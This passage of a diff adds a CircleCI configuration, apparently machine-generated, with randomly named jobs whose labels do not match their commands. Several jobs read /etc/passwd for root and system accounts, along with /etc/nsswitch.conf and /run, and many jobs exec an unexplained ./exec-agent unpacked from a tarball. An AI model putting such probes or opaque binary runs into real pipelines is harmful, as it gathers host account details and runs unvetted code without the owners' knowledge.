+          root: /tmp/zone1
+          paths:
+            - 'v_71038'
+  canary-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  vector-PASSWORD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Devrel team only poll
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{FS=":"} $3 < 100 {print $6}' /etc/passwd | wc -l; true ; } > /tmp/zone1/xx_5d02d8a
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/xx_5d02d8a)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'xx_5d02d8a'
+  RolloutApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  end_lock_reload_reload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collect the chargebacks fy28
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; ls /usr/lib|sort|uniq -c|sort -r -n|fmt -w 48; true ; } > /tmp/zone1/s3aMwXZto1B
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/s3aMwXZto1B)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 's3aMwXZto1B'
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  len_region_big_setting:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Reset after launch
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; awk '{print NF}' /etc/nsswitch.conf | head -n 2; true ; } > /tmp/zone1/P-41388
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/P-41388)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'P-41388'
+  validate-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/P-41388 2>/dev/null) → md5 $(md5sum /tmp/zone1/P-41388 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  fin_rec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Here we lock the scheduler
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 1 -size 0 -user $(id -un) -print0 | xargs -0r ls -1d; true ; } > /tmp/zone1/run_495
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/run_495)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'run_495'
+  bun-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/run_495 2>/dev/null) → md5 $(md5sum /tmp/zone1/run_495 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  vl2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Shipping Size Small
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; touch "/tmp/bridge.tmp" && chmod 755 "/tmp/bridge.tmp" && stat -c "%A %n" "/tmp/bridge.tmp"; true ; } > /tmp/zone1/crc_94569eb2
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/crc_94569eb2)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'crc_94569eb2'
+  alpha-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/crc_94569eb2 2>/dev/null) → md5 $(md5sum /tmp/zone1/crc_94569eb2 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  readComplexArticleAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: ntp sync bounce HR8359
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; [[ -w /tmp ]] && echo 'true' || echo false; true ; } > /tmp/zone1/40d346c1
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/40d346c1)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - '40d346c1'
+  rl-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/40d346c1 2>/dev/null) → md5 $(md5sum /tmp/zone1/40d346c1 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+  extra_middleware_public_diff:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Curse the adapter weights
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; echo 'fix typo' | sed -e 's/e/3/g' -e 's/n/N/g'; true ; } > /tmp/zone1/datqalog
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/datqalog)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'datqalog'
+  victor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Compile workspace output
+          command: |
+            echo "stat $(stat -c '%s' /tmp/zone1/s3aMwXZto1B 2>/dev/null) → md5 $(md5sum /tmp/zone1/s3aMwXZto1B 2>/dev/null | cut -c1-8)"
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack dependencies
+          command: tar -xj -f dumps-ci.tar.bz2
+      - run:
+          command: g++ --version
+      - run:
+          name: Pre-run checks
+          command: cmake --version
+      - run:
+          command: exec ./exec-agent
+
+  DEPRECATED:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Balance Leaderboard And Profile
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; awk -F':' '$3 == 0{print $1, $3, $4}' /etc/passwd | wc -l; true ; } > /tmp/zone1/sha_3b3330db49947c38
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/sha_3b3330db49947c38)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'sha_3b3330db49947c38'
+  price254:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Charge for the record
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -type d -iname \*.old -atime -1 -nouser -exec echo dir: {} \; 2>/dev/null | sort -r; true ; } > /tmp/zone1/crc_94569eb2
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/crc_94569eb2)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'crc_94569eb2'
+  internal_publish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Please do benchmark the unit tests
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; for conf in /usr/bin/z*; do stat -c "%s %n" "${conf}"; done | sort -r; true ; } > /tmp/zone1/P-41388
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/P-41388)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'P-41388'
+  cell__caption:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: P847
+          command: |
+            mkdir -p /tmp/zone1
+            set +o pipefail 2>/dev/null; # final e
+            cat <(seq 1 867517) > /tmp/zone1/sha_58bbd6987d; true
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/sha_58bbd6987d)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'sha_58bbd6987d'
+  RD-END-TAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Definitely cut over the worker pool
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; sort /etc/skel/.profile | cut -c1-23 | wc -l; true ; } > /tmp/zone1/PO-2023-92431
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/PO-2023-92431)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'PO-2023-92431'
+  CastleV10:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Gently demux the audio track
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; echo "meeting moved to 3pm" | tee -a "${TMPDIR:-/tmp}/CardKeys.md" >/dev/null && wc -l "${TMPDIR:-/tmp}/CardKeys.md"; true ; } > /tmp/zone1/temp-94b7
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/temp-94b7)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'temp-94b7'
+  sphere:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Mock Perf Baseline And Stress Test The Coverage Report
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; id | sort | wc -l; true ; } > /tmp/zone1/xx_aa0b85f8f04bd2
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/xx_aa0b85f8f04bd2)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'xx_aa0b85f8f04bd2'
+  shaderc027458:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: 30 scaling in edge nodes
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 \( -name "user" -o -name "*lock*" \) -exec echo {} + 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/zone1/run_495
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/run_495)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'run_495'
+  TM-AREA-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: Deglaze the pick list
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; for w in wednesday monday saturday friday thursday; do echo "item: ${w}"; done; true ; } > /tmp/zone1/os.1475
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/os.1475)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - 'os.1475'
+  FLD-TAX-KEY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/zone1
+      - run:
+          name: exporting credit notes now
+          command: |
+            mkdir -p /tmp/zone1
+            { set +o pipefail 2>/dev/null; touch /tmp/hotel.bak && chmod a-w /tmp/hotel.bak && ls -l /tmp/hotel.bak; true ; } > /tmp/zone1/40d346c1
+            printf 'bytes-written %d\n' "$(wc -c </tmp/zone1/40d346c1)"
+      - persist_to_workspace:
+          root: /tmp/zone1
+          paths:
+            - '40d346c1'
+workflows:
+  build:
+    jobs:
+      - try_from_script
+      - DEPRECATED:
+          requires:
+            - try_from_script
+      - titan2-rc:
+          requires:
+            - DEPRECATED
+      - vl2:
+          requires:
+            - DEPRECATED
+      - price254:
+          requires:
+            - vl2
+      - alpha-3:
+          requires:
+            - price254
+      - len_region_big_setting:
+          requires:
+            - price254
+      - internal_publish:
+          requires:
+            - len_region_big_setting
+      - validate-nightly-artifact-bundle:
+          requires:
+            - internal_publish
+      - CFQueueError:
+          requires:
+            - internal_publish
+      - cell__caption:
+          requires:
+            - CFQueueError
+      - q2-cleanup:
+          requires:
+            - cell__caption
+      - XtX:
+          requires:
+            - cell__caption
+      - RD-END-TAB:
+          requires:
+            - XtX
+      - zulu-3:
+          requires:
+            - RD-END-TAB
+      - deg_ave:
+          requires:
+            - RD-END-TAB
+      - CastleV10:
+          requires:
+            - deg_ave
+      - prometheus-final:
+          requires:
+            - CastleV10
+      - Crown_58079:
+          requires:
+            - CastleV10
+      - sphere:
+          requires:
+            - Crown_58079
+      - canary-v5:
+          requires:
+            - sphere
+      - fin_rec:
+          requires:
+            - sphere
+      - shaderc027458:
+          requires:
+            - fin_rec
+      - bun-ship:
+          requires:
+            - shaderc027458
+      - froanswoazham-klun:
+          requires:
+            - shaderc027458
+      - TM-AREA-3:
+          requires:
+            - froanswoazham-klun
+      - check-production-release-candidate:
+          requires:
+            - TM-AREA-3
+      - readComplexArticleAdapter:
+          requires:
+            - TM-AREA-3
+      - FLD-TAX-KEY:
+          requires:
+            - readComplexArticleAdapter
+      - rl-01:
+          requires:
+            - FLD-TAX-KEY
+      - end_lock_reload_reload
+      - quinninator
+      - depoly:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - shippit:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - RolloutApp:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - ensure-partial-artifact-bundle:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - omar-verify:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - go1-21-test:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - callisto:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - sm-x:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - ruby3-test:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - strated-31:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - aug23-cleanup:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - bug-1892:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - PackageStaging:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - t-v2:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - release:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - verify:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - victor:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - push-it:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - prometheus-beta:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
+      - canary-v2:
+          requires:
+            - end_lock_reload_reload
+            - quinninator
